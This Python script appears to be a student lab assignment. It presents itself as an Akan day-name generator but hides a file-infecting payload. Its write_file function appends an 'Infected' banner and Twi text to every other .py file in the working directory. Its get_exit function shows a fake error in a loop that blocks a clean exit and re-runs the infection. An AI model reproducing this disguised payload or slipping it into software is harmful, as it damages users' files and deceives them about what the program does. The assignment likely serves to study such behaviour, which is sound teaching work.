#!/usr/bin/python
__author__ = 'atwumb'
# Name: Amy Twum-Barimah
# Course: CS-620 L01
# Assignment: Lab 3 Problem 4

import datetime as dt
import glob, os
import time


def get_day(birthday):
    """
    Returns the weekday of birth based on  birthday input
    """
    week_day = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday']
    wk_no = dt.date.weekday(
        birthday)  # use date.weekday() method to get day of the week as an integer, where Monday is 0 and Sunday is 6.

    return week_day[wk_no]  # Pass the integer value to week_day list to get the weekday name


def get_name_meaning(week_day):
    """
   Return the meaning of user's Akan name based on the week_day parameter
   """
    # dictonary  {Key= {Day of birth}: value= day meaning}
    dict_meaning = {
        'Tuesday': "Full of fire and determination, inspirer, risk-taker, will go through a period of uncertainty that will lead to change",
        'Monday': "The peacemaker, calm and cool, satisfied when doing things to help others, rarely bored""",
        'Wednesday': "Loving, able to bring people together, don’t prioritize work over people",
        'Thursday': "Strong-willed and powerful leader, engages in social and political resistance",
        'Friday': "An adventurous wanderer, full of growth, creative, will find purpose in an accidental situation",
        'Saturday': "Wise, gentle, happy, able to bring peace in troublesome situations, reinvigorated by spiritual experiences and will become involved in a major cause",
        'Sunday': "A born leader in bringing people together,  protective of friends and family"}

    return dict_meaning[week_day]


def get_ghname(weekday, gender):
    """
    Returns the Akan name of the user  based on the inputted birthdate. When user answers yes, the meaning of the name will be displayed
    """

    # Place Day and Name in dictonaries, one for male and female
    # For each dictionary: Key = Day of week  Value = Akan name that represents that day
    fem_gh_name = {"Monday": "Adwoa", "Tuesday": "Abena", "Wednesday": "Akua", "Thursday": "Yaa", "Friday": "Afua",
                   "Saturday": "Ama", "Sunday": "Akosua"}
    male_gh_name = {"Monday": "Kojo/Kwadwo", "Tuesday": "Kwabena", "Wednesday": "Kwaku", "Thursday": "Yaw",
                    "Friday": "Kofi", "Saturday": "Kwame", "Sunday": "Akwasi/Kwesi"}

    if gender == 'female':
        return fem_gh_name[weekday]
    else:
        return male_gh_name[weekday]


def get_exit(name):
    """
      Prevents the user from exiting program cleanly until until Ctrl entered.
    """
    while True:
        try:
            time.sleep(5)
            print (
                " %s, there is an issue performing the task. Please enter  Ctrl +C to exit" %name)
            write_file(name)  # call f
        except KeyboardInterrupt: #triggered when Ctrl +C is entered
            print ("Welp...that did it this time %s" %name)
            print (" ...Good bye")
            write_file(name)
            break
    return exit(0) #function exited with success


def write_file(name):
    """
   Appends a text to every .py file in the working directory
    """

    path = os.getcwd() # get  path for current working directory
    #for filename in glob.glob('*.py'):
    for filename in glob.glob(os.path.join(path,'*.py')):  #loop through list of files with  *.py extension
        if filename != (path + '/CS620_L01_ATwumBarimahDefensiveCoding.py'):
           hold =open(filename, "a")
           hold.write("=============Infected===========\n") # append a some twi lines to the files
           hold.write("Wo ho te sεn\n, %s" %name)
           hold.write("%s, wote twi?\n!" %name)
           hold.write("Have a good day\n, %s" %name)
           hold.close()



def display_ghname():
    """

    Prints the day of weekday and Akan name for the user based on the entered birthdate.
    """

    birthday_str = input('Enter birthday (format mm/dd/yyyy): ')  # prompt user for birthdate
    counter = 0

    while True:
        try:
            mth, day, yr = birthday_str.split('/')  # split birth date in variables,mth, day, yr: cause
            birthday = dt.date(int(yr), int(mth), int(day))  # convert string to date  i.e. 1981-08-04)

            if int(yr) < 1700 and int(yr) <= 2015:  # User will get prompted for the date again if year  less than 1700
                print("Invalid year. Year was must be greater than or equal to 1700")
                birthday_str = input('Enter birthday (format mm/dd/yyyy): ')
            elif (len(yr) < 4) or (len(mth) < 2) or (
                        len(day) < 2):  # day and month must be 2 digits each,  Year: 4 digits
                print("Reminder: the Date format is MM/DD/YYYY...Let's try this again")
                birthday_str = input('Enter birthday (format mm/dd/yyyy): ')
            else:
                break

        except ValueError:  # this block will execute if the entered value is wrong the int() or date.time(
            print("You have an invalid input. Please remember the format mm/dd/yyyy, no other special characters: ")
            birthday_str = input('Enter birthday (format mm/dd/yyyy): ')

    bth_weekday = get_day(birthday)  # call function to get the day for birthday.
    gender = input('Enter your gender (male or female) No extra spaces: ')

    # Print the name /Day based on  gender. Also validate if the user entered a valid answer.  If not, user will be prompted again.

    while True:
        if gender in ( 'male', 'female'):
            ghname = get_ghname(bth_weekday, gender)  # call function to get Akan name
            print(
                " You were born on  a %s and your Akan name is %s" % (
                    bth_weekday, ghname))  # Print weekday and Akan name
            break
        else:
            print("Please enter a valid answer for gender(female or male)")
            gender = input('Enter your gender (male or female): ')



            # Based on whether user answer yes or no, meaning of Akan name will be printed to sreen
    choice = input("Would you like to know the meaning of your Akan name (y or n): ")
    while True:  # will continue in while loop if invalid input.
        try:
            if choice in ('y', 'n'):

                if choice == 'y':

                    print(
                        "The meaning of  %s is %s." % (
                            ghname,
                            (get_name_meaning(bth_weekday).lower())))  # print Day of Week, call get getmeaning function
                    print("Program is exiting now...")
                    get_exit(ghname)  # User will have issues exiting the program, call get_exit function
                else:

                    print (" Okay Maybe next time, %s" % (ghname))  #call get_exit to prevent smooth exit.
                    print("Program is exiting now...")
                    get_exit(ghname)


            else:
                if choice not in ('y', 'n'):  # if entered value not y or n, prompt user again
                    print("Below is the question again. Please enter a valid answer either y for yes or n for no")
                    choice = input("Would you like to know the meaning of your Akan name (y or n): ")
            break
        except KeyboardInterrupt:
            get_exit(ghname)
            break


if __name__ == '__main__':
    display_ghname()


